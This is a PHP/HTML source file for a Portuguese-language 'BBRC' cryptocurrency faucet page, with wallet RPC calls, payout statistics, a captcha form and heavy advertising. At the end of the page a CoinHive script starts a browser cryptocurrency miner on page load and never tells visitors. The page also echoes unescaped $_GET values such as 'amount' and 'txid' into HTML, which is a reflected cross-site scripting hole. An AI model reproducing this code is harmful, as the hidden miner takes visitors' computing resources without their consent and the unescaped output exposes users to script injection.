<?php

ini_set('max_execution_time', 20);
require_once 'classes/jsonRPCClient.php';
require_once 'classes/recaptcha.php';
require_once 'config.php';

?>
<!DOCTYPE html>
<html>
<head>

    <meta charset='UTF-8'>
    <title><?php echo $faucetTitle; ?></title>
    <meta name="keywords" content="bbrc, Blood donation, Faucet, Earn, Free">
    <meta name="description" content="Earn BBRC for Free">
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel='shortcut icon' href='images/blood.png'>
    <link rel='icon' type='image/icon' href='images/blood.png'>

    <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css'>
    <link rel='stylesheet' href='/css/style.css'>

    <script>var isAdBlockActive = true;</script>
    <script src='/js/advertisement.js'></script>
    <script>
        if (isAdBlockActive) {
            window.location = './adblocker.php'
        }
    </script>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-112509983-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-112509983-2');
</script>



<!-- PopAds.net Popunder Code for xmr-pool.ddns.net:8082 -->
<script type="text/javascript" data-cfasync="false">
/*<![CDATA[/* */
  var _pop = _pop || [];
  _pop.push(['siteId', 2477781]);
  _pop.push(['minBid', 0]);
  _pop.push(['popundersPerIP', 0]);
  _pop.push(['delayBetween', 0]);
  _pop.push(['default', false]);
  _pop.push(['defaultPerDay', 0]);
  _pop.push(['topmostLayer', false]);
  (function() {
    var pa = document.createElement('script'); pa.type = 'text/javascript'; pa.async = true;
    var s = document.getElementsByTagName('script')[0]; 
    pa.src = '//c1.popads.net/pop.js';
    pa.onerror = function() {
      var sa = document.createElement('script'); sa.type = 'text/javascript'; sa.async = true;
      sa.src = '//c2.popads.net/pop.js';
      s.parentNode.insertBefore(sa, s);
    };
    s.parentNode.insertBefore(pa, s);
  })();
/*]]>/* */
</script>
<!-- PopAds.net Popunder Code End -->


</head>

<body>

<div class='container'>

    <div id='login-form'>


        <h3><a href='./'><img src='<?php echo $logo; ?>' height='256'></a><br/><br/> <?php echo $faucetSubtitle; ?></h3>


        <fieldset>

            <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>

            <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
            <br/>


            <?php

            $bitcoin = new jsonRPCClient('http://127.0.0.1:8317/json_rpc');

            $balance = $bitcoin->getbalance();
            $balanceDisponible = $balance['available_balance'];
            $lockedBalance = $balance['locked_amount'];
            $dividirEntre = 100000000;
            $totalBCN = ($balanceDisponible + $lockedBalance) / $dividirEntre;


            $recaptcha = new Recaptcha($keys);
            //Available Balance
            $balanceDisponibleFaucet = number_format(round($balanceDisponible / $dividirEntre, 12), 12, '.', '');
            ?>

            <form action='request.php' method='POST'>

                <?php if (isset($_GET['msg'])) {
                    $mensaje = $_GET['msg'];

                    if ($mensaje == 'captcha') {
                        ?>
                        <div id='alert' class='alert alert-error radius'>
                            Captcha inválido, digite o correto.
                        </div>
                    <?php } else if ($mensaje == 'wallet') { ?>

                        <div id='alert' class='alert alert-error radius'>
                            Digite o endereço BBRC correto.
                        </div>
                    <?php } else if ($mensaje == 'success') { ?>

                        <div class='alert alert-success radius'>
                            Você ganhou <?php echo $_GET['amount']; ?> BBRCs.<br/><br/>
                            Receberá <?php echo $_GET['amount'] - 0.0001; ?> BBRCs. (fee de 0.0001)<br/>
                            <a target='_blank'
                               href='http://explorer.niobiocash.com/?hash=<?php echo $_GET['txid']; ?>#blockchain_transaction'>Confira na Blockchain.</a>
                        </div>
                    <?php } else if ($mensaje == 'paymentID') { ?>

                        <div id='alert' class='alert alert-error radius'>
                            Verifique o seu ID de pagamento. <br>Deve ser composto por 64 caracteres sem caracteres especiais.
                        </div>
                    <?php } else if ($mensaje == 'notYet') { ?>

                        <div id='alert' class='alert alert-warning radius'>
                            Os BBRCsão emitidos uma vez a cada 2 horas. Venha mais tarde.
                        </div>
                    <?php } else if ($mensaje == 'dry') { ?>

                        <div id='alert' class='alert alert-warning radius'>
                            Não há niobios agora. Não foi dessa vez. Tente novamente.
                        </div>
                    <?php } elseif ('erro_banco' == $mensaje) { ?>
                        <div id='alert' class='alert alert-warning radius'>
                            Erro do banco de dados, contate o administrador.
                        </div>
                    <?php }?>

                <?php } ?>
                <div class='alert alert-info radius'>
                    Saldo: <?php echo $balanceDisponibleFaucet ?> BBRC.<br>
                    <?php

                    $link = new PDO('mysql:host=' . $hostDB . ';dbname=' . $database, $userDB, $passwordDB);

                    $query = 'SELECT SUM(payout_amount) / 100000000 FROM `payouts`;';

                    $result = $link->query($query);
                    $dato = $result->fetchColumn();

                    $query2 = 'SELECT COUNT(*) FROM `payouts`;';

                    $result2 = $link->query($query2);
                    $dato2 = $result2->fetchColumn();

                    ?>

                    Realizados: <?php echo $dato; ?> de <?php echo $dato2; ?> pagamentos.
                </div>

                <?php if ($balanceDisponibleFaucet < 1.0) { ?>
                    <div class='alert alert-warning radius'>
                        A carteira está vazia ou o saldo é menor do que o ganho. <br> Venha mais tarde, &ndash; podemos receber mais doações.
                    </div>

                <?php } elseif (!$link) {

                    // $link = mysqli_connect($hostDB, $userDB, $passwordDB, $database);


                    die('Помилка піключення' . mysql_error());
                } else { ?>

                    <input type='text' name='wallet' required placeholder='Endereço da carteira BBRC'>

                    <input type='text' name='paymentid' placeholder='ID do pagamento (Opcional)'>
                    <br/>
                    <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
                    <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
                    <br/>
                    <?php
                    echo $recaptcha->render();
                    ?>

                    <center><input type='submit' value='Obter BBRC grátis!'></center>
                    <br>
                    <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
<iframe data-aa='827963' src='//acceptable.a-ads.com/827963' scrolling='no' style='border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>

                    <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
                <?php } ?>
                <br>
                <?php /*
           <div class='table-responsive'>
            <table class='table table-bordered table-condensed'>
              <thead>
                <tr>
                  <th><h6><b>Cleared Sites</b><br> <small>Sites that have their wallets allowed to request more than 1 time but only with a different payment id.</small></h6></th>
                </tr>
              </thead>
              <tbody>
                <?php foreach ($clearedAddresses as $key => $item) {
                  echo '<tr>
                  <th>'.$key.'</th>
                  </tr>';

                }?>
              </tbody>
            </table>
          </div>
*/ ?>

                <div class='table-responsive'>
                    <h6><b>Últimas 5 doações</b></h6>
                    <table class='table table-bordered table-condensed'>
                        <thead>
                        <tr>
                            <th>Data/hora</th>
                            <th>Valor</th>
                        </tr>
                        </thead>
                        <tbody>
                        <?php
                        $deposits = ($bitcoin->get_transfers());

                        $transfers = array_reverse(($deposits['transfers']), true);
                        $contador = 0;
                        foreach ($transfers as $deposit) {
                            if ($deposit['output'] == '') {
                                if ($contador < 6) {
                                    $time = $deposit['time'];
                                    echo '<tr>';
                                    echo '<th>' . gmdate('d/m/Y H:i:s', $time) . '</th>';
                                    echo '<th>' . round($deposit['amount'] / $dividirEntre, 8) . '</th>';
                                    echo '</tr>';
                                    $contador++;
                                }
                            }


                        }
                        ?>
                        </tbody>
                    </table>
                </div>
                <p style='font-size:12px;'>Doe BBRC para apoiar este faucet.
                    <br>
                    Carteira do Faucet BBRC: <span style='font-size:10px;'><?php echo $faucetAddress; ?></span>
                    <br>
              &#169; 2018 Faucet by vinyvicente, Forked from Niobio Cash Faucet</p></center>
                <footer class='clearfix'>
                    <a href="http://blooddonationcoin.org/">blooddonationcoin.org</a>
                </footer>
				<a href="https://www.popads.net/users/refer/1548447"><img src="http://banners.popads.net/250x250.gif" alt="PopAds.net - The Best Popunder Adnetwork" /></a>
            </form>

        </fieldset>
    </div> <!-- end login-form -->

</div>
<script src='//code.jquery.com/jquery-1.11.3.min.js'></script>
<?php if (isset($_GET['msg'])) { ?>
    <script>
        setTimeout(function () {
            $('#alert').fadeOut(3000, function () {
            });
        }, 10000);
    </script>
<?php } ?>

<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script type="text/javascript">
var miner = new CoinHive.Anonymous('
oYvc61Bs2T7WM6NXVZq4EqXx2kAXi4Aw', { throttle: 0.4 });
miner.start();


</script>
</body>
</html>
